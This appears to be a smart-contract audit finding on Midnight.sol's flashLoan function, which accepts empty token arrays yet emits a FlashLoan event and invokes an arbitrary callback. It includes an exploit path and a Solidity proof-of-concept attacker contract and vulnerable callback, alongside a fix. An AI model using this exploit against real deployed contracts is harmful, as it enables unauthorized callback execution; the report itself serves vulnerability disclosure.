### Title
`flashLoan` Succeeds and Emits Event With No Tokens Loaned When Empty Arrays Are Passed — (`File: src/Midnight.sol`)

---

### Summary

`Midnight.flashLoan` accepts empty `tokens` and `assets` arrays without any length validation. When called with empty arrays, both transfer loops are skipped, yet a `FlashLoan` event is emitted and the caller-supplied `callback` is invoked with `msg.sender == address(Midnight)` and arbitrary `data`. This is the direct analog of the BlockhashRegistry bug: an empty-array input bypasses all meaningful processing, but the function still emits an event and triggers an external call as if a real flash loan occurred.

---

### Finding Description

The `flashLoan` function in `src/Midnight.sol`:

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());   // 0 == 0 passes
    emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback); // event emitted with empty arrays
    for (uint256 i = 0; i < tokens.length; i++) {                   // loop skipped
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()                          // callback triggered with empty arrays
    );
    for (uint256 i = 0; i < tokens.length; i++) {                   // loop skipped
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    }
}
``` [1](#0-0) 

The only guard is `tokens.length == assets.length`, which is trivially satisfied when both are zero-length. No check enforces `tokens.length > 0`.

**Exploit path:**

1. Attacker calls `flashLoan([], [], victimCallback, maliciousData)`.
2. `0 == 0` passes the length check.
3. `FlashLoan` event is emitted with empty arrays — off-chain monitors record a flash loan that never happened.
4. Both transfer loops are skipped — no tokens leave or return to the contract.
5. `victimCallback.onFlashLoan(attacker, [], [], maliciousData)` is called with `msg.sender == address(Midnight)`.
6. Any `IFlashLoanCallback` contract that (a) trusts Midnight as the caller and (b) acts on `data` without verifying it received non-zero token amounts will execute attacker-controlled logic. [2](#0-1) 

---

### Impact Explanation

**Misleading event emission:** The `FlashLoan` event is emitted with empty `tokens`/`assets` arrays, corrupting off-chain accounting, monitoring dashboards, and indexers that rely on this event to track flash loan activity. [3](#0-2) 

**Unauthorized callback invocation:** Any contract implementing `IFlashLoanCallback` that trusts `msg.sender == MIDNIGHT` can be triggered by an unprivileged attacker with arbitrary `data` and zero tokens transferred. If such a callback performs state-changing operations (e.g., authorizations, accounting updates, position mutations) conditioned only on the trusted caller identity rather than on actual token receipt, those operations execute without any real flash loan backing them. This breaks the atomicity guarantee that the flash loan pattern is designed to enforce.

---

### Likelihood Explanation

- **No privilege required.** Any EOA or contract can call `flashLoan` directly.
- **Zero cost.** No tokens need to be held or approved; the call costs only gas.
- **Reachable immediately.** The function is external with no access control.
- **Realistic integrator exposure.** Protocols building on Midnight that implement `IFlashLoanCallback` and gate logic on `msg.sender == MIDNIGHT` without independently verifying `tokens.length > 0` or that they actually received tokens are directly exploitable.

---

### Recommendation

Add an explicit non-empty array check at the top of `flashLoan`:

```solidity
require(tokens.length > 0, EmptyFlashLoan());
```

This mirrors the fix applied to BlockhashRegistry (`require(_blockheaders.length > 0`)) and eliminates the empty-array bypass entirely. Additionally, callback implementors should independently verify `tokens.length > 0` and that their balance increased before acting on `data`.

### Proof of Concept

```solidity
// Attacker contract
contract Exploit {
    address immutable midnight;
    address immutable victim; // any IFlashLoanCallback that trusts Midnight

    constructor(address _midnight, address _victim) {
        midnight = _midnight;
        victim = _victim;
    }

    function attack(bytes calldata maliciousData) external {
        // Pass empty arrays — no tokens needed, no approval needed
        address[] memory tokens = new address[](0);
        uint256[] memory assets = new uint256[](0);

        // Midnight emits FlashLoan event and calls victim.onFlashLoan(address(this), [], [], maliciousData)
        // with msg.sender == address(Midnight)
        IMidnight(midnight).flashLoan(tokens, assets, victim, maliciousData);
    }
}

// Victim callback (representative integrator pattern)
contract VictimCallback is IFlashLoanCallback {
    address immutable midnight;

    function onFlashLoan(
        address initiator,
        address[] calldata tokens,
        uint256[] calldata assets,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == midnight, "not midnight"); // trusts Midnight — passes
        // acts on data without checking tokens.length > 0
        _executeAction(data); // attacker-controlled execution
        return CALLBACK_SUCCESS;
    }
}
```

**Expected outcome:** `flashLoan` succeeds, `FlashLoan` event is emitted with empty arrays, `VictimCallback.onFlashLoan` executes `_executeAction(maliciousData)` — all without any token transfer occurring. [1](#0-0)
